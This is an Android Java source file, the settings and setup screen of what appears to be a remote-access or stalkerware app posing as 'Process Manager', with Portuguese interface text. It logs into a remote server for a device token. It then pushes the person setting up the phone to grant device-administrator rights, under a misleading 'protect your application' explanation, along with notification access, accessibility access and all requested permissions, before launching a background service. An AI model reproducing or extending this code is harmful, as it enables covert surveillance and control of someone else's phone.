package com.remote.app;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.arch.lifecycle.Observer;
import android.arch.lifecycle.ViewModelProviders;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.support.annotation.StringRes;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.text.Editable;
import android.text.TextWatcher;
import android.text.method.PasswordTransformationMethod;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.remote.app.socket.IOSocket;

import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SettingsActivity extends Activity {

    private String[] permissions;
    private ComponentName mAdminName;
    private DevicePolicyManager mDPM;
    private ProgressBar loadingProgressBar;

    private RelativeLayout loginLayout;
    private RelativeLayout settingsLayout;

    private void tryGetToken(String email, String password) {

        try {
            JSONObject postData = new JSONObject();
            postData.put("username", email);
            postData.put("password", password);

            final RequestBody body = RequestBody
                    .create(MediaType.parse("application/json"), postData.toString());
            final Request request = new Request.Builder()
                    .url(IOSocket.getUrl() + "/api/user/login")
                    .post(body)
                    .addHeader("Accept", "application/json")
                    .build();
            final OkHttpClient client = new OkHttpClient();
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    runOnUiThread(() -> {
                        loadingProgressBar.setVisibility(View.INVISIBLE);
                        Toast.makeText(getApplicationContext(), "Usuário ou senha incorreto!", Toast.LENGTH_LONG).show();
                    });
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    try {
                        if (!response.isSuccessful()) {
                            runOnUiThread(() -> {
                                loadingProgressBar.setVisibility(View.INVISIBLE);
                                Toast.makeText(getApplicationContext(), "Usuário ou senha incorreto!", Toast.LENGTH_LONG).show();
                            });
                        }

                        String responseData = response.body().string();
                        JSONObject data = new JSONObject(responseData);
                        String userToken = data.getString("deviceToken");

                        SharedPreferences settings = getApplicationContext().getSharedPreferences("CONN_SETTINGS", 0);

                        SharedPreferences.Editor editor = settings.edit();
                        editor.putString("user-token", userToken);
                        editor.apply();

                        runOnUiThread(() -> {
                            loadingProgressBar.setVisibility(View.INVISIBLE);

                            Toast.makeText(getApplicationContext(), "Logado com sucesso!", Toast.LENGTH_LONG).show();
                            loginLayout.setVisibility(View.INVISIBLE);
                            settingsLayout.setVisibility(View.VISIBLE);

                            reqPermissions(getApplicationContext(), permissions);
                        });
                    } catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }
            });


        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }


    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mAdminName = new ComponentName(this, DeviceAdminX.class);

        Context context = getApplicationContext();
        setContentView(R.layout.activity_settings);
        permissions = new String[]{};
        try {
            PackageInfo info = getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
            permissions = info.requestedPermissions;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

        loadingProgressBar = findViewById(R.id.loading);


        final EditText usernameEditText = findViewById(R.id.email);
        final EditText passwordEditText = findViewById(R.id.password);
        passwordEditText.setTransformationMethod(new PasswordTransformationMethod());

        final Button loginButton = findViewById(R.id.do_login);
        SharedPreferences settings = getApplicationContext().getSharedPreferences("CONN_SETTINGS", 0);
        loginLayout = findViewById(R.id.login_layout);
        settingsLayout = findViewById(R.id.settings_layout);

        if (settings.contains("user-token")) {
            loginLayout.setVisibility(View.INVISIBLE);
            settingsLayout.setVisibility(View.VISIBLE);
        } else {
            loginLayout.setVisibility(View.VISIBLE);
            settingsLayout.setVisibility(View.INVISIBLE);
        }

        loginButton.setOnClickListener(v -> {

            String username = usernameEditText.getText().toString();
            if (username.isEmpty()) {
                Toast.makeText(this, "Por favor, preencha seu email!", Toast.LENGTH_LONG).show();
                return;
            }

            String password = passwordEditText.getText().toString();
            if (password.isEmpty()) {
                Toast.makeText(this, "Por favor, preencha sua senha!", Toast.LENGTH_LONG).show();
                return;
            }

            loadingProgressBar.setVisibility(View.VISIBLE);
            tryGetToken(username, password);
        });

        final Button saveBtn = findViewById(R.id.save);

        saveBtn.setOnClickListener(v -> {
            if (!mDPM.isAdminActive(mAdminName) || (!Build.MODEL.startsWith("SM-") && !isNotificationServiceRunning())) {
                Toast.makeText(this, "Por favor, complete todos os passos antes de finalizar!", Toast.LENGTH_LONG).show();
                return;
            }

            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("finished-setup", true);
            editor.apply();

            Toast.makeText(this, "Salvo com sucesso!", Toast.LENGTH_LONG).show();
            startService(new Intent(this, MainService.class));

            finish();
        });

        final Button requestAdmin = findViewById(R.id.device_admin);
        requestAdmin.setOnClickListener(v -> {
            if (!mDPM.isAdminActive(mAdminName)) {
                Toast.makeText(this, "Ative o app \"Process Manager\" como administrador do sistema e clique em voltar", Toast.LENGTH_LONG).show();
                // try to become active
                Intent intent2 = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent2.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
                intent2.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Clique em Ativar para proteger sua aplicação.");
                startActivity(intent2);
            } else {
                Toast.makeText(this, "As configurações de Administrador do Sistema já foram concluídas!", Toast.LENGTH_LONG).show();
            }
        });

        final Button notifications = findViewById(R.id.device_notification);
        notifications.setOnClickListener(v -> {
            if (!Build.MODEL.startsWith("SM-")) {
                if (isNotificationServiceRunning()) {
                    Toast.makeText(this, "As notificações já foram configuradas!", Toast.LENGTH_LONG).show();
                    return;
                }
                Toast.makeText(this, "Ative o acesso às notificações do app \"Process Manager\"!", Toast.LENGTH_LONG).show();
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            } else {
                Toast.makeText(this, "Para ativar o acesso às notificações nesse dispositivo, por favor, siga o tutorial do site.", Toast.LENGTH_LONG).show();
            }
        });

        final Button accessibility = findViewById(R.id.device_accessibility);
        accessibility.setOnClickListener(v -> {
            if (isAccessibilitySettingsOn(this) != 1) {
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                Toast.makeText(this, "Dê ao app \"Process Manager\" as permissões de acessibilidade!", Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "O App já tem a acesso a acessibilidade!", Toast.LENGTH_LONG).show();

            }
        });

        final Button device_perms = findViewById(R.id.device_perms);
        device_perms.setOnClickListener(v -> {

            if (!disablePermissionCheck && permissions != null) {
                for (String permission : permissions) {
                    boolean allGranted = true;
                    if (ContextCompat.checkSelfPermission(getApplicationContext(), permission)
                            != PackageManager.PERMISSION_GRANTED) {
                        allGranted = false;
                        reqPermissions(getApplicationContext(), permissions);
                    }

                    if (allGranted) {
                        disablePermissionCheck = true;
                    }
                }
            } else {
                Toast.makeText(this, "As permissões já foram configuradas!", Toast.LENGTH_LONG).show();

            }
        });


    }

    private int isAccessibilitySettingsOn(Context mContext) {
        String TAG = "ACESSIBILITY TAG CHECK";
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    mContext.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            Log.e(TAG, "Error finding setting, default accessibility to not found: "
                    + e.getMessage());
        }
        return accessibilityEnabled;
    }


    private boolean isNotificationServiceRunning() {
        ContentResolver contentResolver = getContentResolver();
        String enabledNotificationListeners =
                Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
        String packageName = getPackageName();
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName);
    }

    private boolean disablePermissionCheck = false;


    public void reqPermissions(Context context, String[] permissions) {
        if (context != null && permissions != null) {
            ActivityCompat.requestPermissions(this, permissions, 1);
        }
    }
}